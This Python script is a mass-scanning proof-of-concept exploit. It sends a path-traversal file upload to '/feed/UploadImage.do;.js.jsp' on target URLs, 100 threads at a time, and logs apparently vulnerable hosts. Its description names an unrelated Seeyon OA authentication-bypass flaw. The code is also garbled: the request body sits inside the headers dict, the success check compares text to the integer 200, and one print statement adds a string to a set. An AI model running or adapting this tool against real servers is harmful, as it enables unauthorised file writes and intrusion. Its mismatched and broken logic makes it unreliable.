import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OAthirdpartyController接口身份鉴别绕过漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url = target + "/feed/UploadImage.do;.js.jsp"
    headers ={
        'User-Agent': 'Mozilla/4.0(compatible; MSIE 9.0; Windows NT 6.1)', 
        'Content-Length': '274' ,
        'Content-Type': 'multipart/form-data;' 
        'boundary=----WebKitFormBoundaryxegqoxxi ',
        'Accept-Encoding': 'gzip ',
        '---WebKitFormBoundaryxegqoxxi '
        'Content-Disposition: '
        'form-data; '
        'name="file"; '
        'filename="../../../../../../././../../../../../java/fh/tomcat_fhxszsq/LiveBos/FormBuilder/' 
        'feed/jsp/vtnifpvi.js"' 
        'Content-Type': 'image/jpeg' 
        'GIF89a 123123123 '
        '---WebKitFormBoundaryxegqoxxi--'
        }
 

    try:
        res = requests.post(url=url,verify=False,headers=headers,).text
        if res == 200:
              with open(r'cg.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'可能存在漏洞')
        else:
             print('[-]'+{target}+'可能不存在漏洞')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__':
    main()
